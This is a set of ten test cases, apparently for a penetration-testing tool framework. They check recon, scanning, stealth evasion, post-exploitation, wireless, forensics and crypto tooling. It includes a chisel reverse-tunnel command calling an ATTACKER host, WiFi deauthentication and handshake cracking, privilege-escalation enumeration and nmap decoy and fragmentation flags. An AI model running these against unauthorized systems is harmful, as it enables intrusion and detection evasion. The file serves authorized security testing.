# Tool Mastery — Test Cases

## TC-TM-001: Reconnaissance Tool Proficiency

**Severity**: HIGH

**Objective**: Verify correct usage of reconnaissance tools for a web target, including subdomain enumeration, HTTP probing, and technology fingerprinting.

**Prerequisites**: Kali Linux with subfinder, amass, whatweb, httpx, waybackurls, gau installed and configured with API keys.

**Test Steps**:
1. Execute subfinder for subdomain enumeration: `subfinder -d TARGET -all -v -o subs.txt`
2. Run amass in passive mode: `amass enum -passive -d TARGET -o amass_subs.txt`
3. Pipe combined results to httpx for live host detection: `cat subs.txt amass_subs.txt | sort -u | httpx -status-code -title -tech-detect -o alive.txt`
4. Run whatweb on discovered hosts for technology fingerprinting
5. Collect waybackurls and gau output for historical URL discovery
6. Verify all output files contain valid, parseable results

**Expected Result**: Subdomain list with 10+ entries, live host inventory with HTTP status codes, technology stack identified for each live host, historical URL collection complete.

**Remediation**: If tools return empty results, verify API key configuration in `~/.config/subfinder/provider-config.yaml` and `~/.config/amass.ini`. Check network connectivity and DNS resolution for the target domain.

**Pass Criteria**: All reconnaissance tools execute without errors. Output files are non-empty and contain structured data. At least 5 unique subdomains discovered. Technology fingerprint identifies at least 3 technologies.

---

## TC-TM-002: Scanning Tool Selection by Target Type

**Severity**: HIGH

**Objective**: Verify tool-selector.sh returns correct tools for different target types (web, network, cloud, API) and that recommended tools are installed and functional.

**Prerequisites**: tool-selector.sh available in validation/ directory. Target configuration with multiple target types defined.

**Test Steps**:
1. Query tools for web target: `bash validation/tool-selector.sh --target-type web --phase scan`
2. Verify output includes nmap, nuclei, nikto, testssl
3. Query tools for network target: `bash validation/tool-selector.sh --target-type network --phase scan`
4. Verify output includes nmap, masscan, rustscan, crackmapexec
5. Query tools for cloud target: `bash validation/tool-selector.sh --target-type cloud --phase scan`
6. Verify output includes scoutSuite, cloudsploit, pmapper
7. Query tools for API target: `bash validation/tool-selector.sh --target-type api --phase scan`
8. Verify output includes kiterunner, arjun, nuclei

**Expected Result**: Correct tool recommendations per target type with appropriate command flags. No missing tools in output.

**Remediation**: If tool-selector.sh returns incorrect tools, update the tool mapping configuration. If recommended tools are missing, install them via `apt install <tool>` or their respective installation methods.

**Pass Criteria**: All four target types produce tool recommendations containing the expected primary tools. No false tool recommendations for unrelated target types. Output format is consistent across all queries.

---

## TC-TM-003: Stealth vs Aggressive Mode Tool Variants

**Severity**: MEDIUM

**Objective**: Verify stealth mode produces appropriate low-noise command variants compared to aggressive mode for all tool categories.

**Prerequisites**: tool-selector.sh available. Understanding of stealth vs. aggressive scan profiles.

**Test Steps**:
1. Query normal/aggressive mode: `bash validation/tool-selector.sh --target-type web --phase scan`
2. Verify nmap command uses `-T4` timing (aggressive)
3. Verify nuclei uses default concurrency (no rate limiting)
4. Query stealth mode: `bash validation/tool-selector.sh --target-type web --phase scan --stealth`
5. Verify nmap command uses `-sS -T2 -f -D RND:10` (stealth)
6. Verify nuclei uses `-rl 50 -bs 10` rate limiting
7. Verify sqlmap uses `--delay=5 --random-agent` in stealth mode
8. Verify ffuf uses `-rate 10` in stealth mode

**Expected Result**: Stealth mode produces lower-noise command variants with timing delays, fragmentation, decoys, and rate limiting. Aggressive mode produces speed-optimized commands.

**Remediation**: If stealth variants are missing or incorrect, update the stealth profile in tool-selector.sh configuration. Verify that stealth flags do not break tool functionality by testing against a local target.

**Pass Criteria**: Every tool with a stealth variant shows at least 3 differences from the aggressive variant (timing, fragmentation, rate limiting, decoys, or randomization). All stealth commands are syntactically valid.

---

## TC-TM-004: Tool Combination Chain for Web Assessment

**Severity**: CRITICAL

**Objective**: Verify tool combination produces a valid multi-step attack chain for a complete web application assessment with correct data handoff between tools.

**Prerequisites**: Target defined, all web assessment tools available (subfinder, httpx, nuclei, sqlmap, dalfox, ffuf).

**Test Steps**:
1. Select recon tools for web target
2. Execute subdomain enumeration: `subfinder -d TARGET -o subs.txt`
3. Pass results to httpx for live host detection: `cat subs.txt | httpx -status-code -o alive.txt`
4. Pass live hosts to nuclei for vulnerability scanning: `cat alive.txt | nuclei -t cves/ -severity critical,high`
5. Pass live hosts to ffuf for directory discovery: `ffuf -u HOST/FUZZ -w wordlist.txt`
6. Verify data flows correctly between tools through pipe and file redirection
7. Verify each tool's output is valid input for the next tool in the chain

**Expected Result**: Valid attack chain with data handoff between tools. Each phase produces output that the next phase can consume without manual reformatting. Chain completes end-to-end without errors.

**Remediation**: If data handoff fails between tools, check output format compatibility. Use `grep`, `awk`, or `sed` to normalize output between tools. Verify that `httpx` outputs URLs in the correct format for downstream tools.

**Pass Criteria**: Complete tool chain executes from subdomain enumeration through vulnerability discovery without manual intervention. All intermediate files are non-empty. At least one potential finding reaches the final analysis stage.

---

## TC-TM-005: Proficiency Level Assessment for Core Tools

**Severity**: MEDIUM

**Objective**: Assess and verify proficiency levels for core tools (nmap, sqlmap, metasploit, burpsuite) against the four-level proficiency framework.

**Prerequisites**: Tool inventory available in TOOLS.md. Access to all core tools for verification.

**Test Steps**:
1. Read tool inventory from TOOLS.md to identify core tools
2. For each core tool (nmap, sqlmap, metasploit, burpsuite):
   - Verify Beginner level: Execute help command and describe primary use case
   - Verify Intermediate level: Execute targeted scan/exploit with correct flags for a specific scenario
   - Verify Advanced level: Write custom script or configuration (NSE script, rc file, custom wordlist rules)
   - Verify Expert level: Demonstrate troubleshooting capability and identify tool limitations
3. Record proficiency levels in TOOLS.md with timestamps
4. Verify proficiency claims are consistent with actual demonstration

**Expected Result**: Proficiency assessment for each core tool with documented evidence. Each level has concrete verification output. Proficiency claims match demonstrated capability.

**Remediation**: If proficiency gaps are identified, create targeted learning plans: review tool documentation, practice with CTF challenges, and build custom scripts to demonstrate advanced capability. Update TOOLS.md with revised proficiency levels.

**Pass Criteria**: All four core tools have documented proficiency assessments. At least Intermediate level verified for all core tools. Evidence files contain command output for each verification step. No gaps between claimed and demonstrated proficiency.

---

## TC-TM-006: Output Format Verification Across Tools

**Severity**: MEDIUM

**Objective**: Verify tool-selector.sh and individual tools produce valid output in all supported formats (markdown, JSON, commands).

**Prerequisites**: tool-selector.sh available. Core tools installed.

**Test Steps**:
1. Generate markdown output: `bash validation/tool-selector.sh --target-type web --format markdown`
2. Verify markdown contains proper headers (#, ##) and tables (| |)
3. Generate JSON output: `bash validation/tool-selector.sh --target-type web --format json`
4. Validate JSON is parseable: `cat output.json | python3 -m json.tool`
5. Generate commands output: `bash validation/tool-selector.sh --target-type web --format commands`
6. Verify commands are executable shell commands (start with tool name, have valid flags)
7. Test nmap output format: `nmap -oX scan.xml TARGET` then validate XML
8. Test nuclei output format: verify JSON, markdown, and text output modes

**Expected Result**: All three output formats are valid and usable. JSON passes validation. Markdown has proper structure. Commands are syntactically correct and executable.

**Remediation**: If output formats are invalid, check tool version compatibility. Some tools change output format between versions. Update parsing logic to handle version-specific output differences.

**Pass Criteria**: All output formats validate without errors. JSON is parseable by python3 json.tool. Markdown has at least 3 headers and 1 table. Command output contains at least 5 valid shell commands.

---

## TC-TM-007: Post-Exploitation Tool Verification

**Severity**: HIGH

**Objective**: Verify correct usage of post-exploitation tools including privilege escalation enumeration, credential extraction, and tunneling utilities.

**Prerequisites**: Access to a test environment with Linux and Windows targets. Tools: linpeas, winpeas, mimikatz, chisel, ligolo-ng installed.

**Test Steps**:
1. Execute linpeas on Linux target: `./linpeas.sh -a 2>&1 | tee linpeas_output.txt`
2. Verify output includes privilege escalation vectors (SUID, capabilities, cron jobs, etc.)
3. Execute winpeas on Windows target: `winpeas.exe fast cmd`
4. Verify output includes Windows-specific escalation paths
5. Set up chisel tunnel: `chisel server --reverse -p 8080` on attacker, `chisel client ATTACKER:8080 R:socks` on target
6. Verify tunnel connectivity: `proxychains curl http://internal-target`
7. Test ligolo-ng as alternative tunneling tool
8. Document tunnel setup and teardown procedures

**Expected Result**: Privilege escalation enumeration identifies potential vectors. Tunneling tools establish connectivity to internal networks. All tools produce structured, parseable output.

**Remediation**: If privilege escalation tools miss known vectors, verify the tool version is up-to-date. If tunneling fails, check firewall rules, verify listening ports, and confirm compatible chisel/ligolo versions on both endpoints.

**Pass Criteria**: Linpeas output contains at least 5 escalation check categories. Winpeas identifies at least 3 Windows escalation paths. Chisel tunnel successfully forwards traffic to an internal target. All evidence captured in structured files.

---

## TC-TM-008: Wireless and Mobile Tool Verification

**Severity**: MEDIUM

**Objective**: Verify correct usage of wireless assessment tools (aircrack-ng suite, wifite) and mobile security tools (frida, objection, drozer, jadx).

**Prerequisites**: Wireless adapter with monitor mode support. Android test device or emulator. Tools: aircrack-ng, wifite, frida, objection, drozer, jadx installed.

**Test Steps**:
1. Enable monitor mode: `airmon-ng start wlan0`
2. Capture WiFi traffic: `airodump-ng wlan0mon -w capture`
3. Deauthenticate client for handshake capture: `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon`
4. Attempt handshake crack: `aircrack-ng -w wordlist.txt capture-01.cap`
5. Connect frida to Android device: `frida-ps -U`
6. Launch objection against test app: `objection -g com.test.app explore`
7. Decompile APK with jadx: `jadx -d output/ test.apk`
8. Run drozer scan: `drozer console connect` then `run scanner.provider.injection -a com.test.app`

**Expected Result**: WiFi assessment captures handshake and attempts crack. Mobile tools connect to device, enumerate app components, and identify potential vulnerabilities. All tools produce usable output.

**Remediation**: If wireless adapter fails monitor mode, check driver compatibility (`airmon-ng check kill`). If frida fails to connect, verify frida-server is running on the device with correct architecture. If jadx fails, check Java version compatibility.

**Pass Criteria**: Monitor mode activated successfully. Handshake capture file created and non-empty. Frida connects to target device and lists processes. Objection launches and executes at least 3 commands. Jadx produces decompiled Java source. All evidence files captured.

---

## TC-TM-009: Forensics Tool Chain Verification

**Severity**: MEDIUM

**Objective**: Verify correct usage of forensics tools for disk analysis, memory forensics, and binary reverse engineering across different evidence types.

**Prerequisites**: Test disk image, memory dump file, and binary executable available. Tools: volatility, binwalk, foremost, strings, ghidra, radare2 installed.

**Test Steps**:
1. Identify file types: `file disk_image.dd binary_file`
2. Analyze disk image with binwalk: `binwalk -e disk_image.dd`
3. Carve files with foremost: `foremost -i disk_image.dd -o recovered/`
4. Run volatility memory analysis: `vol.py -f memory.dmp imageinfo`
5. List processes from memory: `vol.py -f memory.dmp --profile=PROFILE pslist`
6. Extract strings from binary: `strings -n 8 binary | grep -i "password\|key\|http"`
7. Analyze binary with radare2: `r2 -A binary -c "afl; pdf @main; q"`
8. Verify all tools produce structured output

**Expected Result**: Disk analysis extracts embedded files. Memory forensics identifies processes and potential artifacts. Binary analysis reveals function structure and embedded strings. Cross-tool validation confirms findings.

**Remediation**: If volatility fails profile detection, manually specify profile with `--profile=`. If binwalk misses embedded files, try foremost or scalpel as alternatives. If radare2 analysis is incomplete, increase analysis depth with `aaa`.

**Pass Criteria**: Binwalk identifies at least 2 embedded file signatures. Volatility successfully identifies memory profile and lists 10+ processes. Strings extraction reveals meaningful artifacts. Radare2 disassembles main function. All output files are non-empty and parseable.

---

## TC-TM-010: Crypto and Steganography Tool Verification

**Severity**: LOW

**Objective**: Verify correct usage of cryptographic analysis tools and steganography detection/extraction tools for hidden data recovery.

**Prerequisites**: Test files with embedded steganography, encrypted files, and hash samples. Tools: openssl, hashid, steghide, zsteg, exiftool, binwalk installed.

**Test Steps**:
1. Identify hash types: `hashid HASH_VALUE`
2. Attempt hash cracking with hashcat: `hashcat -m TYPE hashes.txt wordlist.txt`
3. Analyze SSL certificates: `openssl s_client -connect TARGET:443 -showcerts`
4. Check image metadata with exiftool: `exiftool image.jpg`
5. Attempt steganography extraction with steghide: `steghide extract -sf image.jpg`
6. Detect PNG steganography with zsteg: `zsteg image.png`
7. Analyze file structure with binwalk: `binwalk -e suspicious_file`
8. Verify crypto operations with openssl: `openssl enc -d -aes-256-cbc -in encrypted.file -out decrypted.file`

**Expected Result**: Hash types correctly identified. SSL certificate analysis reveals configuration details. Steganography tools detect or extract hidden data. Crypto operations complete successfully for known test data.

**Remediation**: If hashid returns ambiguous results, try multiple hash types with hashcat. If steghide fails with unknown password, use stegcracker for brute-force. If zsteg finds nothing, try different bit planes or use binwalk for non-image steganography.

**Pass Criteria**: Hashid correctly identifies at least 3 hash types. Exiftool extracts metadata from test images. At least one steganography tool detects hidden content. OpenSSL successfully decrypts test encrypted file. All tool outputs captured in evidence files.
